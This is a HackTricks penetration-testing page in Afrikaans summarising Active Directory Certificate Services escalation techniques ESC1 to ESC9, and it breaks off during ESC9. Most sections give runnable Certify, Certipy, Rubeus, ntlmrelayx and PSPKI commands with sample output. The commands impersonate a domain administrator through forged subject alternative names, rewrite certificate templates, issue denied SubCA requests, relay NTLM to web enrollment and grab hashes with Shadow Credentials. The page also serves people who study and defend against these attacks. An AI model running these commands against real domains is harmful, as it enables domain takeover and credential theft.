# AD CS Domein Eskalasie

{{#include ../../../banners/hacktricks-training.md}}


**Dit is 'n opsomming van eskalasietegniek afdelings van die plasings:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Foutief Geconfigureerde Sertifikaat Sjablone - ESC1

### Verduideliking

### Foutief Geconfigureerde Sertifikaat Sjablone - ESC1 Verduidelik

- **Inskrywingsregte word aan laag-geprivilegieerde gebruikers deur die Enterprise CA toegeken.**
- **Bestuurder goedkeuring is nie nodig nie.**
- **Geen handtekeninge van gemagtigde personeel is nodig nie.**
- **Sekuriteitsbeskrywings op sertifikaat sjablone is te permissief, wat laag-geprivilegieerde gebruikers toelaat om inskrywingsregte te verkry.**
- **Sertifikaat sjablone is geconfigureer om EKU's te definieer wat autentisering fasiliteer:**
- Uitgebreide Sleutel Gebruik (EKU) identifiseerders soos Kliënt Autentisering (OID 1.3.6.1.5.5.7.3.2), PKINIT Kliënt Autentisering (1.3.6.1.5.2.3.4), Slim Kaart Aanmelding (OID 1.3.6.1.4.1.311.20.2.2), Enige Doel (OID 2.5.29.37.0), of geen EKU (SubCA) is ingesluit.
- **Die vermoë vir versoekers om 'n subjectAltName in die Sertifikaat Ondertekening Versoek (CSR) in te sluit, word deur die sjabloon toegelaat:**
- Die Active Directory (AD) prioritiseer die subjectAltName (SAN) in 'n sertifikaat vir identiteitsverifikasie indien teenwoordig. Dit beteken dat deur die SAN in 'n CSR te spesifiseer, 'n sertifikaat aangevra kan word om enige gebruiker (bv. 'n domein administrateur) na te boots. Of 'n SAN deur die versoeker gespesifiseer kan word, word in die sertifikaat sjabloon se AD objek deur die `mspki-certificate-name-flag` eienskap aangedui. Hierdie eienskap is 'n bitmasker, en die teenwoordigheid van die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` vlag laat die spesifikasie van die SAN deur die versoeker toe.

> [!CAUTION]
> Die konfigurasie wat uiteengesit is, laat laag-geprivilegieerde gebruikers toe om sertifikate met enige SAN van keuse aan te vra, wat autentisering as enige domein hoofde deur Kerberos of SChannel moontlik maak.

Hierdie funksie word soms geaktiveer om die on-the-fly generasie van HTTPS of gasheer sertifikate deur produkte of ontplooiingsdienste te ondersteun, of as gevolg van 'n gebrek aan begrip.

Daar word opgemerk dat die skep van 'n sertifikaat met hierdie opsie 'n waarskuwing aktiveer, wat nie die geval is wanneer 'n bestaande sertifikaat sjabloon (soos die `WebServer` sjabloon, wat `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` geaktiveer het) gedupliseer en dan gewysig word om 'n autentisering OID in te sluit nie.

### Misbruik

Om **kwetsbare sertifikaat sjablone te vind** kan jy uitvoer:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Om **hierdie kwesbaarheid te misbruik om 'n administrateur na te boots** kan 'n mens die volgende uitvoer:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Dan kan jy die gegenereerde **sertifikaat na `.pfx`** formaat omskakel en dit gebruik om **te outentiseer met Rubeus of certipy** weer:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows binaries "Certreq.exe" & "Certutil.exe" kan gebruik word om die PFX te genereer: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die opsporing van sertifikaat sjablone binne die AD Forest se konfigurasieskema, spesifiek dié wat nie goedkeuring of handtekeninge vereis nie, wat 'n Klientverifikasie of Slimkaart Aanmelding EKU het, en met die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` vlag geaktiveer, kan gedoen word deur die volgende LDAP-navraag uit te voer:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misgeconfigureerde Sertifikaat Sjablone - ESC2

### Verklaring

Die tweede misbruikscenario is 'n variasie van die eerste een:

1. Registraseregte word aan laag-geprivilegieerde gebruikers deur die Enterprise CA toegeken.
2. Die vereiste vir bestuurder goedkeuring is gedeaktiveer.
3. Die behoefte aan gemagtigde handtekeninge word weggelaat.
4. 'n Oormatig toelaatbare sekuriteitsbeskrywer op die sertifikaat sjabloon gee sertifikaat registraseregte aan laag-geprivilegieerde gebruikers.
5. **Die sertifikaat sjabloon is gedefinieer om die Any Purpose EKU of geen EKU in te sluit nie.**

Die **Any Purpose EKU** laat 'n sertifikaat toe om deur 'n aanvaller vir **enige doel** verkry te word, insluitend kliëntverifikasie, bedienerverifikasie, kodehandtekening, ens. Dieselfde **tegniek wat vir ESC3 gebruik is** kan gebruik word om hierdie scenario te benut.

Sertifikate met **geen EKUs**, wat as ondergeskikte CA sertifikate optree, kan vir **enige doel** benut word en kan **ook gebruik word om nuwe sertifikate te teken**. Daarom kan 'n aanvaller arbitrêre EKUs of velde in die nuwe sertifikate spesifiseer deur 'n ondergeskikte CA sertifikaat te gebruik.

Egter, nuwe sertifikate wat geskep word vir **domeinverifikasie** sal nie funksioneer as die ondergeskikte CA nie vertrou word deur die **`NTAuthCertificates`** objek, wat die standaardinstelling is. Nietemin kan 'n aanvaller steeds **nuwe sertifikate met enige EKU** en arbitrêre sertifikaatwaardes skep. Hierdie kan potensieel **misbruik** word vir 'n wye reeks doeleindes (bv. kodehandtekening, bedienerverifikasie, ens.) en kan beduidende implikasies hê vir ander toepassings in die netwerk soos SAML, AD FS, of IPSec.

Om sjablone wat by hierdie scenario pas binne die AD Forest se konfigurasieskema op te som, kan die volgende LDAP-navraag uitgevoer word:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misgeconfigureerde Registrasie Agent Sjablone - ESC3

### Verduideliking

Hierdie scenario is soos die eerste en tweede een, maar **misbruik** 'n **ander EKU** (Sertifikaat Aansoek Agent) en **2 verskillende sjablone** (daarom het dit 2 stelle vereistes),

Die **Sertifikaat Aansoek Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), bekend as **Registrasie Agent** in Microsoft dokumentasie, laat 'n hoofpersoon toe om **te registreer** vir 'n **sertifikaat** namens **'n ander gebruiker**.

Die **“registrasie agent”** registreer in so 'n **sjabloon** en gebruik die resulterende **sertifikaat om 'n CSR mede-te teken namens die ander gebruiker**. Dit **stuur** die **mede-getekende CSR** na die CA, wat registreer in 'n **sjabloon** wat **“registreer namens”** toelaat, en die CA antwoord met 'n **sertifikaat wat aan die “ander” gebruiker behoort**.

**Vereistes 1:**

- Registrasiegeregte word aan laag-geprivilegieerde gebruikers deur die Enterprise CA toegestaan.
- Die vereiste vir bestuurder goedkeuring word weggelaat.
- Geen vereiste vir gemagtigde handtekeninge nie.
- Die sekuriteitsbeskrywer van die sertifikaat sjabloon is buitensporig toelaatbaar, wat registrasiegeregte aan laag-geprivilegieerde gebruikers toeken.
- Die sertifikaat sjabloon sluit die Sertifikaat Aansoek Agent EKU in, wat die aansoek van ander sertifikaat sjablone namens ander hoofpersone moontlik maak.

**Vereistes 2:**

- Die Enterprise CA verleen registrasiegeregte aan laag-geprivilegieerde gebruikers.
- Bestuurder goedkeuring word omseil.
- Die sjabloon se skema weergawe is of 1 of oorskry 2, en dit spesifiseer 'n Aansoek Beleid Uitreiking Vereiste wat die Sertifikaat Aansoek Agent EKU vereis.
- 'n EKU gedefinieer in die sertifikaat sjabloon laat domeinverifikasie toe.
- Beperkings vir registrasie agente word nie op die CA toegepas nie.

### Misbruik

Jy kan [**Certify**](https://github.com/GhostPack/Certify) of [**Certipy**](https://github.com/ly4k/Certipy) gebruik om hierdie scenario te misbruik:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **gebruikers** wat toegelaat word om 'n **inskrywingsagent sertifikaat** te **verkry**, die sjablone waarin inskrywings **agente** toegelaat word om in te skryf, en die **rekeninge** namens wie die inskrywingsagent mag optree, kan deur ondernemings CA's beperk word. Dit word bereik deur die `certsrc.msc` **snap-in** te open, **regsklik op die CA** te doen, **eienskappe** te klik, en dan na die “Enrollment Agents” tab te **navigeer**.

Dit word egter opgemerk dat die **standaard** instelling vir CA's is om “**Moet nie inskrywingsagente beperk nie**.” Wanneer die beperking op inskrywingsagente deur administrateurs geaktiveer word, en dit op “Beperk inskrywingsagente” gestel word, bly die standaardkonfigurasie uiters permissief. Dit laat **Enigiemand** toe om in alle sjablone in te skryf as enige iemand.

## Kw vulnerable Sertifikaat Sjabloon Toegang Beheer - ESC4

### **Verklaring**

Die **veiligheidsbeskrywer** op **sertifikaat sjablone** definieer die **toestemmings** wat spesifieke **AD prinsipes** het ten opsigte van die sjabloon.

As 'n **aanvaller** die nodige **toestemmings** het om 'n **sjabloon** te **verander** en enige **uitbuitbare miskonfigurasies** soos in **vorige afdelings** uiteengesit, kan voorregverhoging gefasiliteer word.

Opmerklike toestemmings wat van toepassing is op sertifikaat sjablone sluit in:

- **Eienaar:** Gee implisiete beheer oor die objek, wat die verandering van enige eienskappe toelaat.
- **VolleBeheer:** Stel volledige gesag oor die objek in, insluitend die vermoë om enige eienskappe te verander.
- **SkryfEienaar:** Laat die verandering van die objek se eienaar toe na 'n prinsipe onder die aanvaller se beheer.
- **SkryfDacl:** Laat die aanpassing van toegangbeheer toe, wat moontlik 'n aanvaller VolleBeheer kan gee.
- **SkryfEiendom:** Magtig die redigering van enige objek eienskappe.

### Misbruik

'n Voorbeeld van 'n privesc soos die vorige een:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 is wanneer 'n gebruiker skryfregte oor 'n sertifikaat sjabloon het. Dit kan byvoorbeeld misbruik word om die konfigurasie van die sertifikaat sjabloon te oorskry om die sjabloon kwesbaar te maak vir ESC1.

Soos ons in die pad hierbo kan sien, het slegs `JOHNPC` hierdie regte, maar ons gebruiker `JOHN` het die nuwe `AddKeyCredentialLink` rand aan `JOHNPC`. Aangesien hierdie tegniek verband hou met sertifikate, het ek hierdie aanval ook geïmplementeer, wat bekend staan as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hier is 'n bietjie voorsmakie van Certipy se `shadow auto` opdrag om die NT hash van die slagoffer te verkry.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kan die konfigurasie van 'n sertifikaat sjabloon met 'n enkele opdrag oorskryf. Deur **standaard** sal Certipy die konfigurasie **oorskryf** om dit **kwetsbaar te maak vir ESC1**. Ons kan ook die **`-save-old` parameter spesifiseer om die ou konfigurasie te stoor**, wat nuttig sal wees om die konfigurasie na ons aanval te **herstel**.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kwetsbare PKI Objekt Toegang Beheer - ESC5

### Verduideliking

Die uitgebreide web van onderling verbonde ACL-gebaseerde verhoudings, wat verskeie objekte buite sertifikaat sjablone en die sertifikaatowerheid insluit, kan die sekuriteit van die hele AD CS-stelsel beïnvloed. Hierdie objekte, wat sekuriteit aansienlik kan beïnvloed, sluit in:

- Die AD rekenaar objek van die CA bediener, wat gecompromitteer kan word deur meganismes soos S4U2Self of S4U2Proxy.
- Die RPC/DCOM bediener van die CA bediener.
- Enige afstammeling AD objek of houer binne die spesifieke houer pad `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Hierdie pad sluit in, maar is nie beperk tot, houers en objekte soos die Sertifikaat Sjablone houer, Sertifikasie Owerhede houer, die NTAuthCertificates objek, en die Registrasie Dienste Houer.

Die sekuriteit van die PKI stelsel kan gecompromitteer word as 'n laag-geprivilegieerde aanvaller daarin slaag om beheer oor enige van hierdie kritieke komponente te verkry.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Verduideliking

Die onderwerp wat in die [**CQure Academy pos**](https://cqureacademy.com/blog/enhanced-key-usage) bespreek word, raak ook die **`EDITF_ATTRIBUTESUBJECTALTNAME2`** vlag se implikasies, soos uiteengesit deur Microsoft. Hierdie konfigurasie, wanneer geaktiveer op 'n Sertifikasie Owerheid (CA), laat die insluiting van **gebruikersgedefinieerde waardes** in die **onderwerp alternatiewe naam** vir **enige versoek** toe, insluitend dié wat uit Active Directory® saamgestel is. Gevolglik laat hierdie bepaling 'n **indringer** toe om te registreer deur **enige sjabloon** wat opgestel is vir domein **autentisering**—specifiek dié wat oop is vir **onbevoegde** gebruikersregistrasie, soos die standaard Gebruiker sjabloon. As gevolg hiervan kan 'n sertifikaat beveilig word, wat die indringer in staat stel om as 'n domein administrateur of **enige ander aktiewe entiteit** binne die domein te autentiseer.

**Let wel**: Die benadering om **alternatiewe name** in 'n Sertifikaat Ondertekening Versoek (CSR) by te voeg, deur die `-attrib "SAN:"` argument in `certreq.exe` (genoem “Naam Waarde Pare”), bied 'n **kontras** van die uitbuitingsstrategie van SANs in ESC1. Hier lê die onderskeid in **hoe rekeninginligting ingekapsuleer word**—binne 'n sertifikaat attribuut, eerder as 'n uitbreiding.

### Misbruik

Om te verifieer of die instelling geaktiveer is, kan organisasies die volgende opdrag met `certutil.exe` gebruik:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Hierdie operasie gebruik essensieel **remote registry access**, daarom kan 'n alternatiewe benadering wees:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Gereedskap soos [**Certify**](https://github.com/GhostPack/Certify) en [**Certipy**](https://github.com/ly4k/Certipy) is in staat om hierdie miskonfigurasie te detecteer en dit te benut:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Om hierdie instellings te verander, met die aanname dat 'n mens **domein administratiewe** regte of ekwivalente het, kan die volgende opdrag vanaf enige werkstasie uitgevoer word:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Om hierdie konfigurasie in jou omgewing te deaktiveer, kan die vlag verwyder word met:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Na die Mei 2022 sekuriteitsopdaterings, sal nuut uitgereikte **certificates** 'n **sekuriteitsuitbreiding** bevat wat die **aanvrager se `objectSid` eienskap** inkorporeer. Vir ESC1, word hierdie SID afgelei van die gespesifiseerde SAN. egter, vir **ESC6**, spieël die SID die **aanvrager se `objectSid`**, nie die SAN nie.\
> Om ESC6 te benut, is dit noodsaaklik dat die stelsel kwesbaar is vir ESC10 (Swak Sertifikaat Kaartjies), wat die **SAN bo die nuwe sekuriteitsuitbreiding** prioriteer.

## Kwesbare Sertifikaat Owerheid Toegang Beheer - ESC7

### Aanval 1

#### Verklaring

Toegangbeheer vir 'n sertifikaat owerheid word gehandhaaf deur 'n stel toestemmings wat CA aksies regeer. Hierdie toestemmings kan gesien word deur `certsrv.msc` te benader, met die rechtermuisklik op 'n CA, eienskappe te kies, en dan na die Sekuriteit tab te navigeer. Boonop kan toestemmings opgenoem word met die PSPKI module met opdragte soos:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Dit bied insigte in die primêre regte, naamlik **`ManageCA`** en **`ManageCertificates`**, wat ooreenstem met die rolle van “CA administrateur” en “Sertifikaatbestuurder” onderskeidelik.

#### Misbruik

Die besit van **`ManageCA`** regte op 'n sertifikaatowerheid stel die hoof in staat om instellings op afstand te manipuleer met behulp van PSPKI. Dit sluit in om die **`EDITF_ATTRIBUTESUBJECTALTNAME2`** vlag te skakel om SAN-spesifikasie in enige sjabloon toe te laat, 'n kritieke aspek van domein-eskalasie.

Vereenvoudiging van hierdie proses is haalbaar deur die gebruik van PSPKI se **Enable-PolicyModuleFlag** cmdlet, wat wysigings toelaat sonder direkte GUI-interaksie.

Die besit van **`ManageCertificates`** regte fasiliteer die goedkeuring van hangende versoeke, wat effektief die "CA sertifikaatbestuurder goedkeuring" beskerming omseil.

'n Kombinasie van **Certify** en **PSPKI** modules kan gebruik word om 'n sertifikaat aan te vra, goed te keur en af te laai:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Aanval 2

#### Verduideliking

> [!WARNING]
> In die **vorige aanval** is **`Manage CA`** regte gebruik om die **EDITF_ATTRIBUTESUBJECTALTNAME2** vlag te **aktiveer** om die **ESC6 aanval** uit te voer, maar dit sal geen effek hê totdat die CA diens (`CertSvc`) herbegin word nie. Wanneer 'n gebruiker die `Manage CA` toegangreg het, mag die gebruiker ook die **diens herbegin**. Dit **beteken egter nie dat die gebruiker die diens op afstand kan herbegin** nie. Verder, E**SC6 mag nie regtig werk nie** in die meeste gepatchte omgewings weens die sekuriteitsopdaterings van Mei 2022.

Daarom word 'n ander aanval hier aangebied.

Voorvereistes:

- Slegs **`ManageCA` toestemming**
- **`Manage Certificates`** toestemming (kan toegeken word vanaf **`ManageCA`**)
- Sertifikaat sjabloon **`SubCA`** moet **geaktiveer** wees (kan geaktiveer word vanaf **`ManageCA`**)

Die tegniek berus op die feit dat gebruikers met die `Manage CA` _en_ `Manage Certificates` toegangregte **mislukte sertifikaat versoeke kan uitreik**. Die **`SubCA`** sertifikaat sjabloon is **kwetsbaar vir ESC1**, maar **slegs administrateurs** kan in die sjabloon registreer. Dus kan 'n **gebruiker** **aansoek doen** om in die **`SubCA`** te registreer - wat **weggestoot** sal word - maar **dan deur die bestuurder daarna uitgereik** sal word.

#### Misbruik

Jy kan **jouself die `Manage Certificates`** toegangreg gee deur jou gebruiker as 'n nuwe offisier toe te voeg.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`** sjabloon kan **geaktiveer word op die CA** met die `-enable-template` parameter. Standaard is die `SubCA` sjabloon geaktiveer.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
As ons die vereistes vir hierdie aanval nagekom het, kan ons begin deur **'n sertifikaat aan te vra gebaseer op die `SubCA` sjabloon**.

**Hierdie versoek sal geweier** word, maar ons sal die privaat sleutel stoor en die versoek-ID aanteken.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Met ons **`Manage CA` en `Manage Certificates`**, kan ons dan die **mislukte sertifikaat** versoek met die `ca` opdrag en die `-issue-request <request ID>` parameter uitreik.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
En uiteindelik kan ons **die uitgereikte sertifikaat** met die `req` opdrag en die `-retrieve <request ID>` parameter **herwin**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay na AD CS HTTP Eindpunte – ESC8

### Verduideliking

> [!NOTE]
> In omgewings waar **AD CS geïnstalleer is**, indien 'n **web inskrywings eindpunt wat kwesbaar is** bestaan en ten minste een **sertifikaat sjabloon gepubliseer is** wat **domein rekenaar inskrywing en kliënt verifikasie** toelaat (soos die standaard **`Machine`** sjabloon), word dit moontlik vir **enige rekenaar met die spooler diens aktief om deur 'n aanvaller gecompromitteer te word**!

Verskeie **HTTP-gebaseerde inskrywingsmetodes** word deur AD CS ondersteun, beskikbaar gemaak deur addisionele bediener rolle wat administrateurs kan installeer. Hierdie interfaces vir HTTP-gebaseerde sertifikaat inskrywing is kwesbaar vir **NTLM relay aanvalle**. 'n Aanvaller, vanaf 'n **gecompromitteerde masjien, kan enige AD rekening naboots wat via inkomende NTLM verifieer**. Terwyl die slagoffer rekening naboots, kan hierdie web interfaces deur 'n aanvaller toegang verkry om **'n kliënt verifikasie sertifikaat aan te vra met die `User` of `Machine` sertifikaat sjablone**.

- Die **web inskrywingsinterface** (n ouer ASP toepassing beskikbaar by `http://<caserver>/certsrv/`), is standaard net op HTTP, wat geen beskerming teen NTLM relay aanvalle bied nie. Boonop, dit laat slegs NTLM verifikasie deur sy Outeurskap HTTP kop toe, wat meer veilige verifikasie metodes soos Kerberos onvanpas maak.
- Die **Sertifikaat Inskrywingsdiens** (CES), **Sertifikaat Inskrywingsbeleid** (CEP) Webdiens, en **Netwerk Toestel Inskrywingsdiens** (NDES) ondersteun standaard onderhandel verifikasie deur hul Outeurskap HTTP kop. Onderhandel verifikasie **ondersteun beide** Kerberos en **NTLM**, wat 'n aanvaller in staat stel om **te verlaag na NTLM** verifikasie tydens relay aanvalle. Alhoewel hierdie webdienste standaard HTTPS inskakel, bied HTTPS alleen **nie beskerming teen NTLM relay aanvalle nie**. Beskerming teen NTLM relay aanvalle vir HTTPS dienste is slegs moontlik wanneer HTTPS gekombineer word met kanaal binding. Ongelukkig aktiveer AD CS nie Verlengde Beskerming vir Verifikasie op IIS nie, wat vereis word vir kanaal binding.

'n Algemene **probleem** met NTLM relay aanvalle is die **kort duur van NTLM sessies** en die onvermoë van die aanvaller om met dienste te interaksie wat **NTLM ondertekening vereis**.

Nietemin, hierdie beperking word oorkom deur 'n NTLM relay aanval te benut om 'n sertifikaat vir die gebruiker te verkry, aangesien die sertifikaat se geldigheidsperiode die sessie se duur bepaal, en die sertifikaat kan gebruik word met dienste wat **NTLM ondertekening vereis**. Vir instruksies oor die gebruik van 'n gesteelde sertifikaat, verwys na:

{{#ref}}
account-persistence.md
{{#endref}}

Nog 'n beperking van NTLM relay aanvalle is dat **'n aanvaller-beheerde masjien deur 'n slagoffer rekening geverifieer moet word**. Die aanvaller kan of wag of probeer om hierdie verifikasie te **dwing**:

{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Misbruik**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` tel **geaktiveerde HTTP AD CS eindpunte** op:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Die `msPKI-Enrollment-Servers` eienskap word deur ondernemings Sertifikaatowerhede (CAs) gebruik om Sertifikaat Registrasie Diens (CES) eindpunte te stoor. Hierdie eindpunte kan ontleed en gelys word deur die hulpmiddel **Certutil.exe** te gebruik:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Misbruik met Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Misbruik met [Certipy](https://github.com/ly4k/Certipy)

Die versoek vir 'n sertifikaat word standaard deur Certipy gemaak op grond van die sjabloon `Machine` of `User`, bepaal deur of die rekeningnaam wat oorgedra word eindig op `$`. Die spesifikasie van 'n alternatiewe sjabloon kan bereik word deur die gebruik van die `-template` parameter.

'n Tegniek soos [PetitPotam](https://github.com/ly4k/PetitPotam) kan dan gebruik word om outentisering af te dwing. Wanneer daar met domeinbeheerders gewerk word, is die spesifikasie van `-template DomainController` vereis.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Geen Sekuriteitsuitbreiding - ESC9 <a href="#id-5485" id="id-5485"></a>

### Verduideliking

Die nuwe waarde **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) vir **`msPKI-Enrollment-Flag`**, bekend as ESC9, verhoed die insluiting van die **nuwe `szOID_NTDS_CA_SECURITY_EXT` sekuriteitsuitbreiding** in 'n sertifikaat. Hierdie vlag word relevant wanneer `StrongCertificateBindingEnforcement` op `1` (die standaardinstelling) gestel is, wat teenstrydig is met 'n instelling van `2`. Die relevansie daarvan word verhoog in scenario's waar 'n swakker sertifikaat-mapping vir Kerberos of Schannel misbruik kan word (soos in ESC10), aangesien die afwesigheid van ESC9 nie die vereistes sou verander nie.

Die toestande waaronder hierdie vlag se instelling betekenisvol word, sluit in:

- `StrongCertificateBindingEnforcement` is nie aangepas na `2` nie (met die standaard wat `1` is), of `CertificateMappingMethods` sluit die `UPN` vlag in.
- Die sertifikaat is gemerk met die `CT_FLAG_NO_SECURITY_EXTENSION` vlag binne die `msPKI-Enrollment-Flag` instelling.
- Enige kliëntverifikasie EKU word deur die sertifikaat gespesifiseer.
- `GenericWrite` regte is beskikbaar oor enige rekening om 'n ander te kompromitteer.

### Misbruik Scenario

Neem aan `John@corp.local` hou `GenericWrite` regte oor `Jane@corp.local`, met die doel om `Administrator@corp.local` te kompromitteer. Die `ESC9` sertifikaat sjabloon, waartoe `Jane@corp.local` toegelaat word om in te skryf, is geconfigureer met die `CT_FLAG_NO_SECURITY_EXTENSION` vlag in sy `msPKI-Enrollment-Flag` instelling.

Aanvanklik word `Jane` se hash verkry met behulp van Shadow Credentials, danksy `John` se `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
